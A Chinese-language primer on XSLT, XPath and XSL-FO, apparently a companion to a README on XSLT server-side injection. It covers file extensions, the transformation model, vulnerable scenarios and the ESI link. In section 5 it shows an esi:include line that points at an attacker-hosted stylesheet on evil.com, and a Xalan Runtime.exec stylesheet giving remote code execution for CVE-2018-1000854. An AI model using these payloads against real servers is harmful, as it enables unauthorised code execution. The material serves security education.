# XSLT 基础知识 — XSLT Server Side Injection 前置理解

> 本文档整理对 XSLT 注入前置概念的逐层解答，覆盖术语家族、扩展名区别、转换模型、真实场景与 ESI 关系。
> 建议在阅读 [README.md](README.md) 之前先阅读本文档。

---

## 1. XSL 和 XSLT 到底是什么关系？

**XSL（Extensible Stylesheet Language）是一个语言家族的总称**，W3C 把它拆成三个规范，各管一件事：

```
XSL 家族
├── XSLT（Transformations）       定义"如何转换"：把 XML 源树变成文本/HTML/另一棵 XML
│                                 ← XSLT 注入攻击的对象就是它
├── XPath                         定义"如何选取"：在 XML 树里定位节点的查询语言
│                                 XSLT 里所有 select= / match= 属性写的都是 XPath 表达式
└── XSL-FO（Formatting Objects）  定义"如何排版"：面向打印/PDF 的分页排版词汇表
                                  （Apache FOP 就是它的实现）
```

要点：

- 口语里说"XSL"通常就是指 XSLT 样式表本身。规范层面，样式表文档的正式名称是 **XSLT 样式表（XSLT stylesheet）**。
- 历史遗留：微软早期文档里的"XSL"指 MSXML 在 W3C 标准定稿前的变体，已经废弃，与现行 XSLT 不兼容。读老文章时要注意区分。
- 版本：**1.0**（1999，部署最广，README 里多数 payload 基于它）、**2.0**（2007）、**3.0**（2017）。版本决定可用函数集——例如 `unparsed-text()` 只有 2.0+ 才有，1.0 处理器上直接报错。

---

## 2. 为什么有 `.xsl` 和 `.xslt` 两个扩展名？区别是什么？

**没有任何功能区别。** 两个扩展名指向完全相同的内容：一个合法 XML 文档，根元素是 `<xsl:stylesheet>`（写 `<xsl:transform>` 也等价）。

| | .xsl | .xslt |
|---|---|---|
| 内容 | XSLT 样式表 | XSLT 样式表 |
| 来源 | W3C 文档记录的传统后缀 | 部分工具链引入（如 Visual Studio 的 XSLT 模板），也用于和 XSL-FO 等家族内文件区分 |
| 处理器如何对待 | 只看内容，不看扩展名 | 只看内容，不看扩展名 |

关键点：

- 处理器只认**文件内容**和 MIME 类型（`application/xslt+xml`，或传统的 `text/xsl`），扩展名只影响文件管理器的图标和上传过滤规则。
- 安全意义：上传白名单如果同时放行 `.xsl` 和 `.xslt`（或者只校验"内容是 XML"），两个扩展名都能作为载荷载体。攻击者服务器上托管样式表时甚至完全不需要扩展名——URL 指向什么后缀都行。

---

## 3. 一次 XSLT 转换到底发生了什么？

转换模型三要素：

```
源树（输入 XML 文档）  +  样式表（一组模板规则）  →  结果树（输出）
```

最简样式表：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html><body><xsl:value-of select="catalog/cd/title"/></body></html>
  </xsl:template>
</xsl:stylesheet>
```

逐行拆解：

| 元素 | 作用 |
|------|------|
| `xsl:stylesheet` | 根元素。`xmlns:xsl` 指向 `http://www.w3.org/1999/XSL/Transform` 才会被识别为 XSLT 指令 |
| `xsl:template match="/"` | 模板规则。`match` 用 XPath 匹配输入节点，`/` 匹配文档根 |
| `xsl:value-of select="..."` | 求值 `select` 里的 XPath 表达式，把结果当文本输出 |
| `xsl:apply-templates` | 递归套用模板处理子节点。处理器有**内置默认规则**：没被显式匹配的节点仍会被遍历 |

理解注入的关键认知：

- **命名空间就是能力边界**。核心指令只有 `http://www.w3.org/1999/XSL/Transform` 这一个命名空间；扩展命名空间（PHP 的 `http://php.net/xsl`、Xalan 的 `xalan://...`、`http://exslt.org/...`）引入的都是规范外的危险函数——这正是注入的根源。
- 转换在**服务端**完成。攻击者只要控制样式表内容（或模板里的拼接片段），指令就在服务器进程里执行——这就是"服务端注入"的含义。

---

## 4. XSLT 服务端注入发生在哪些真实场景？

| 场景 | 说明 |
|------|------|
| 报表/凭证导出 | 政务、金融、电商的"导出 PDF/Excel"：XML 数据 + 样式表 → PDF（Apache FOP/XSL-FO、JasperReports）。模板上传或参数化接口是注入点 |
| 文档转换服务 | docx/odt（本质是 ZIP 包装的 XML）转 HTML/PDF 的转换管道里内嵌 XSLT 步骤 |
| 企业集成 / ESB | Mule ESB、Apache Camel、BizTalk 等消息中间件用 XSLT 做消息格式转换，转换规则可能来自消息本身 |
| 模板上传功能 | 网站允许用户上传自定义模板（简历、报表、凭证），文件被当作样式表直接执行 |
| ESI 处理器 | `esi:include` 的 `stylesheet` 属性让 ESI 标签成为 XSLT 注入载体（见第 5 节） |
| 模板字符串拼接 | 应用把用户输入直接拼进 XSL 模板后交给处理器 |

---

## 5. ESI 和 XSLT 有什么关系？

**结论先行：两者是并列的两种技术，没有隶属关系。联系点在于部分 ESI 实现支持在包含片段时套用 XSLT 样式表。**

### 5.1 什么是 ESI

ESI（Edge Side Include，边缘侧包含）是一种标记语言：页面里写 `<esi:include src="...">` 标签，由边缘服务器/CDN 解析，把远端片段动态拼装进缓存页面。它解决的是"CDN 缓存的整页里，如何局部动态化"的问题。

### 5.2 联系点：esi:include 的 stylesheet 属性

部分 ESI 实现支持 `esi:include` 的 `stylesheet` 属性——包含片段时，对该片段应用一个 XSLT 样式表：

```xml
<esi:include src="http://target/data.xml" stylesheet="http://evil.com/evil.xsl"/>
```

### 5.3 典型案例 CVE-2018-1000854（GoSecure 2019 披露）

Java 实现 **ESIGate**（`org.esigate:esigate-core` < 5.3）会对带 `stylesheet` 属性的 include **自动执行 XSLT**，且默认允许 Xalan 的 Java 扩展。攻击者只要把 `stylesheet` 指向自己托管的恶意样式表，即可 RCE：

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:variable name="cmd"><![CDATA[touch /tmp/pwned]]></xsl:variable>
  <xsl:variable name="rtObj" select="rt:getRuntime()"/>
  <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
</xsl:stylesheet>
```

修复方式是升级到 5.3+，解析器切换为安全模式（禁用 Java 扩展）。

另一个实现 **Akamai ETS**（ESI 测试服务器）支持 `dca="xslt"` 方式的 XSLT include，可触发 XXE/SSRF 与 Billion Laughs DoS。

### 5.4 结论

**ESI 标签只是 XSLT 注入的一种触发场景（载体），不是 XSLT 的一部分。** README 中 §4.2 与 §6.1 的组合攻击即基于此；纯 XSLT 注入不依赖 ESI 存在。

---

## 6. 一句话总结

**XSLT 是 XSL 家族里负责"把 XML 转换成其他格式"的语言；`.xsl` 和 `.xslt` 只是同一种样式表的两个扩展名；服务端只要允许攻击者控制样式表内容——无论入口是模板上传、报表导出参数，还是 ESI 标签的 `stylesheet` 属性——处理器内嵌的扩展函数（`document()`、`php:function`、Java 扩展）就会把"格式转换"变成文件读取、SSRF 甚至 RCE。**
